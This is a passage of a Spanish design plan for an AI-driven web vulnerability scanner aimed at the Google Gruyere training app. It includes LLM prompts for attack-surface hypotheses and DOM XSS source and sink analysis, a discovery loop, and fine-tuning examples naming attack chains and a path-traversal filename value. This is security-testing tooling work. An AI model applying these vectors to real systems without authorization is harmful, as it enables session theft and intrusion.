superficie de ataque. Trabajas en un pentest **autorizado**. Se te da el
contexto de la aplicación escaneada (tecnologías, endpoints, parámetros,
respuestas observadas) y la lista de vulnerabilidades ya encontradas.

Tu misión: razonar sobre qué clases de vulnerabilidades NO han sido probadas
todavía y son plausibles dado el stack y comportamiento observado. Para cada
hipótesis, proponer el endpoint, parámetro y vector de ataque específico.

## Clases a considerar

- Stored XSS chains (campos que se renderizan en otras páginas)
- Prototype pollution en JavaScript del cliente
- Race conditions en operaciones de estado (write-then-read)
- Business logic flaws (saltar validaciones de flujo)
- Second-order injection (payload almacenado, ejecutado en contexto diferente)
- Insecure deserialization (cookies/tokens decodificables)
- Host header injection (para password reset, cache poisoning)
- HTTP parameter pollution
- Nuevas clases derivadas de las ya encontradas (si hay XSS, hay DOM XSS?)

## Output

```json
{
  "hypotheses": [
    {
      "vuln_class": "nombre de la clase",
      "endpoint": "URL o patrón de URL",
      "parameter": "nombre del parámetro o campo",
      "attack_vector": "descripción del vector",
      "rationale": "por qué es plausible dado el contexto",
      "priority": 0.0-1.0
    }
  ]
}
```
```

---

#### 3.2 Nuevo prompt — `js_analysis_system.md`

```markdown
---
name: js_analysis_system
role: system
purpose: Static analysis of client-side JavaScript for DOM XSS sinks and sources
---

Eres un especialista en seguridad de aplicaciones cliente. Se te proporciona
código JavaScript de una aplicación web real (parte de un pentest autorizado).

Analiza el código para identificar:

1. **SINKS peligrosos**: puntos donde datos externos se insertan en el DOM o se evalúan:
   - `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `Function()`,
     `setTimeout/setInterval(string)`, `location.*=`, `.src=`, `.href=`,
     `insertAdjacentHTML()`, `$.html()`, `$(payload)`

2. **SOURCES controlables por el atacante**: orígenes de datos no confiables:
   - `location.search`, `location.hash`, `document.referrer`, `document.URL`,
     `window.name`, `postMessage data`, `localStorage`, `sessionStorage`,
     cookies leídas via JS, parámetros URL, respuestas fetch/XHR

3. **Cadenas Source→Sink**: flujos de datos desde un source hasta un sink
   sin sanitización intermedia

## Output

```json
{
  "sinks": [{"name": "...", "line": N, "context": "..."}],
  "sources": [{"name": "...", "line": N}],
  "flows": [{"source": "...", "sink": "...", "confidence": 0.0-1.0, "description": "..."}]
}
```
```

---

#### 3.3 Nuevo módulo `ai_module/vuln_discovery.py`

```python
"""
vuln_discovery.py — Pipeline de descubrimiento autónomo de vulnerabilidades.

El modelo fine-tuneado tiene conocimiento especializado sobre:
- Patrones de vulnerabilidades en aplicaciones web
- Cadenas de ataque multi-paso
- Correlaciones entre hallazgos (XSS → cookie theft → session hijack)

Este módulo:
1. Recibe el contexto de la aplicación (tecnologías, endpoints, findings actuales)
2. Llama al modelo con el prompt discovery_system
3. Convierte las hipótesis en tareas de prueba para el scanner
4. Retroalimenta los resultados al modelo para iterar
"""
from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass, field
from typing import Any

from ai_module.agent_inference import AgentClient
from ai_module.prompts import load_prompt
from ai_module.structured_inference import parse_json_safe


@dataclass
class AttackHypothesis:
    vuln_class: str
    endpoint: str
    parameter: str
    attack_vector: str
    rationale: str
    priority: float = 0.5
    confirmed: bool = False
    finding: dict | None = None


async def discover_attack_surface(
    client: AgentClient,
    app_context: dict,           # {technologies, endpoints, parameters, headers}
    findings_so_far: list[dict], # findings ya confirmados por el scanner
    max_hypotheses: int = 10,
) -> list[AttackHypothesis]:
    """
    Usa el modelo fine-tuneado para generar hipótesis de vulnerabilidades
    no exploradas todavía.
    
    app_context ejemplo:
    {
      "base_url": "https://target.com/app/",
      "technologies": ["Python 2.7", "webapp2", "Google App Engine"],
      "endpoints": ["/login", "/feed.gtl", "/snippets.gtl", "/upload2"],
      "forms": [{"action": "/newsnippet2", "method": "GET", "fields": ["snippet"]}],
      "response_headers": {"Server": "Google Frontend", "X-XSS-Protection": "0"},
      "js_files": ["/lib.js"],
    }
    """
    system_prompt = load_prompt("discovery_system")
    
    user_message = f"""
## Contexto de la aplicación

```json
{json.dumps(app_context, indent=2)}
```

## Vulnerabilidades ya confirmadas

{json.dumps([f['vuln_type'] for f in findings_so_far], indent=2)}

Propón hasta {max_hypotheses} hipótesis de vulnerabilidades no exploradas,
ordenadas por prioridad descendente.
"""
    
    response = await client.raw_completion(
        system=system_prompt,
        user=user_message,
        response_format="json_object",
    )
    
    parsed = parse_json_safe(response, default={"hypotheses": []})
    hypotheses = [
        AttackHypothesis(**h)
        for h in parsed.get("hypotheses", [])[:max_hypotheses]
    ]
    return sorted(hypotheses, key=lambda h: h.priority, reverse=True)


async def analyze_js_for_dom_xss(
    client: AgentClient,
    js_url: str,
    js_code: str,
) -> dict:
    """
    Analiza código JS con el modelo fine-tuneado para encontrar flows DOM XSS.
    """
    system_prompt = load_prompt("js_analysis_system")
    
    user_message = f"""
Archivo: {js_url}

```javascript
{js_code[:8000]}  # truncar para caber en contexto
```

Identifica todos los sinks, sources y flujos fuente→sink.
"""
    
    response = await client.raw_completion(
        system=system_prompt,
        user=user_message,
        response_format="json_object",
    )
    
    return parse_json_safe(response, default={"sinks": [], "sources": [], "flows": []})


async def iterative_discovery_loop(
    client: AgentClient,
    scanner_core,
    base_url: str,
    max_rounds: int = 3,
) -> list[dict]:
    """
    Loop de descubrimiento iterativo:
    Round 1: Scanner básico → findings iniciales
    Round 2: AI genera hipótesis sobre findings iniciales → nuevos tests
    Round 3: AI refina hipótesis con evidencia de Round 2 → tests avanzados
    """
    all_findings = []
    
    for round_num in range(1, max_rounds + 1):
        # Construir contexto actualizado
        app_context = await _build_app_context(scanner_core, base_url)
        
        # Generar hipótesis con el modelo fine-tuneado
        hypotheses = await discover_attack_surface(
            client, app_context, all_findings
        )
        
        # Convertir hipótesis en tests y ejecutarlos
        round_findings = await _test_hypotheses(scanner_core, hypotheses)
        all_findings.extend(round_findings)
        
        # Si no hay nuevos findings, terminar
        if not round_findings:
            break
    
    return all_findings
```

---

#### 3.4 Modificaciones a `agent_inference.py`

Añadir método `discover_attack_surface()` al `AgentClient` existente:

```python
async def discover_attack_surface(
    self,
    app_context: dict,
    findings_so_far: list[dict],
    max_hypotheses: int = 10,
) -> list[dict]:
    """
    Llama al modelo fine-tuneado con contexto de la app para generar
    hipótesis de nuevas vulnerabilidades.
    
    El modelo tiene conocimiento especializado (via fine-tuning) sobre:
    - Patrones típicos de vulnerabilidades en frameworks conocidos
    - Cadenas de ataque multi-paso (CSRF→XSS, Upload→XSS, IDOR→privesc)
    - Variantes de vulnerabilidades ya encontradas
    """
    from ai_module.vuln_discovery import discover_attack_surface as _discover
    return await _discover(self, app_context, findings_so_far, max_hypotheses)
```

---

### FASE 4 — Fine-tuning Ampliado del Modelo (ongoing)

El modelo actual fue entrenado para triage y síntesis de payloads.
Para descubrimiento autónomo se necesitan ejemplos de entrenamiento adicionales:

#### 4.1 Nuevas categorías de datos de entrenamiento (`dataset_generator.py`)

```python
# Añadir al generador de dataset:
NEW_TRAINING_CATEGORIES = {
    "stored_xss_chain": {
        "input": "aplicación con campo snippet, página de lectura, cookie no HttpOnly",
        "output": "hipótesis: inyectar en snippet → esperar render en perfil → robar cookie"
    },
    "upload_traversal": {
        "input": "upload endpoint con filename sin sanitizar, usuarios con directorios propios",
        "output": "hipótesis: filename=../victim/payload.html → XSS en contexto de victim"
    },
    "csrf_get_form": {
        "input": "formulario GET sin CSRF token, acción /save-profile",
        "output": "hipótesis: imagen en página externa dispara modificación de perfil"
    },
    "xssi_jsonp": {
        "input": "endpoint /feed.gtl, Content-Type: text/html, respuesta con _feed(({...}))",
        "output": "hipótesis: XSSI — sitio externo <script src=/feed.gtl> roba datos privados"
    },
    "dom_xss_sink_source": {
        "input": "lib.js con eval(responseText) y innerHTML=response[uid]",
        "output": "hipótesis: DOM XSS via datos controlables en feed.gtl inyectados via innerHTML"
    },
}
```

#### 4.2 Métricas de evaluación para el modelo de descubrimiento

Añadir a `evaluate_golden.py`:
```python
DISCOVERY_GOLDEN_SET = [
    {
        "app_context": {
            "technologies": ["Python 2.7"],
            "forms": [{"action": "/newsnippet2", "method": "GET"}],
            "cookies": [{"name": "GRUYERE", "httponly": False}],
        },
        "findings_so_far": [],
        "expected_hypotheses": ["Stored XSS", "CSRF GET form", "Cookie theft via XSS"],
    },
    # ... más casos
]

def score_discovery(predicted: list[dict], expected: list[str]) -> float:
    """Precision de hipótesis generadas vs. hipótesis esperadas."""
    predicted_classes = {h.get('vuln_class', '').lower() for h in predicted}
    expected_lower = {e.lower() for e in expected}
    overlap = predicted_classes & expected_lower
    return len(overlap) / len(expected_lower) if expected_lower else 0.0
```

---

## 4. Registro en el Registry

Todos los nuevos testers deben registrarse en `web_security_scanner/modules/registry.py`:

```python
# Añadir a TESTER_REGISTRY:
from .vulnerability_testers.stored_xss_tester_async import StoredXSSTester
from .vulnerability_testers.dom_xss_tester_async import DOMXSSTester
from .vulnerability_testers.xssi_tester_async import XSSITester
from .vulnerability_testers.file_upload_tester_async import FileUploadTester
from .vulnerability_testers.access_control_tester_async import AccessControlTester
from .vulnerability_testers.brute_force_detector_async import BruteForceDetector
from .vulnerability_testers.credential_exposure_tester_async import CredentialExposureTester
from .vulnerability_testers.cookie_analyzer_async import CookieAnalyzer
from .vulnerability_testers.protocol_injection_tester_async import ProtocolInjectionTester

TESTER_REGISTRY = {
    # ... existentes ...
    "stored_xss":          StoredXSSTester,
    "dom_xss":             DOMXSSTester,
    "xssi":                XSSITester,
    "file_upload":         FileUploadTester,
    "access_control":      AccessControlTester,
    "brute_force":         BruteForceDetector,
    "credential_exposure": CredentialExposureTester,
    "cookie_analysis":     CookieAnalyzer,
    "protocol_injection":  ProtocolInjectionTester,
}
```

---

## 5. Cronograma

| Fase | Duración | Entregable |
|------|----------|------------|
| **FASE 1** — Fixes | 1-2 semanas | xss, csrf, path_traversal, idor corregidos |
| **FASE 2** — Nuevos módulos | 3-4 semanas | 9 nuevos testers cubriendo las 33 vulns |
| **FASE 3** — AI discovery | 2-3 semanas | `vuln_discovery.py` + prompts + loop iterativo |
| **FASE 4** — Fine-tuning ampliado | continuo | dataset expandido + métricas discovery |
| **Total** | ~8-10 semanas | 100% cobertura + modelo de descubrimiento |

---

## 6. Cobertura Final por Módulo

```
stored_xss_tester_async.py    → VUL-003, VUL-004
dom_xss_tester_async.py       → VUL-005
xssi_tester_async.py          → VUL-006
idor_tester_async.py (FIX)    → VUL-007 (mejorado)
csrf_tester_async.py (FIX)    → VUL-008, VUL-032
brute_force_detector_async.py → VUL-009
credential_exposure_tester_async.py → VUL-010
cookie_analyzer_async.py      → VUL-015
access_control_tester_async.py → VUL-024, VUL-030, VUL-031
file_upload_tester_async.py   → VUL-025, VUL-026, VUL-029
path_traversal_async.py (FIX) → VUL-027 (URL path)
xss_tester_async.py (FIX)     → VUL-028 (data: URLs)
protocol_injection_tester_async.py → VUL-033
header_security_async.py      → VUL-011-014, VUL-016-023 (ya cubiertos)
vuln_discovery.py (AI)        → Nuevas vulns generadas por el modelo
```

---

## 7. Integración del Modelo Fine-tuneado — Flujo de Datos

```
[Scan inicial]
    Spider + testers básicos
    → findings crudos

[AI Triage — existente]
    agent_inference.triage_finding()
    → TRUE_POSITIVE / FALSE_POSITIVE / UNCERTAIN

[AI Payload Synthesis — existente]
    agent_inference.synthesize_payloads()
    → payloads adaptativos para confirmar hallazgos

[AI Discovery — NUEVO]
    vuln_discovery.discover_attack_surface()
    → hipótesis de nuevas superficies de ataque
    → el scanner genera tests para cada hipótesis
    → findings adicionales retroalimentan al modelo

[AI JS Analysis — NUEVO]
    vuln_discovery.analyze_js_for_dom_xss()
    → flows source→sink en código JS del target
    → DOM XSS findings con evidencia de flujo de datos

[Loop iterativo — NUEVO]
    vuln_discovery.iterative_discovery_loop()
    → 3 rondas: scan → hypothesize → scan refined
    → Máxima cobertura autónoma
```

---

*Plan generado a partir de análisis de brechas contra las 33 vulnerabilidades confirmadas en Google Gruyere (vuldiplomado.md).*
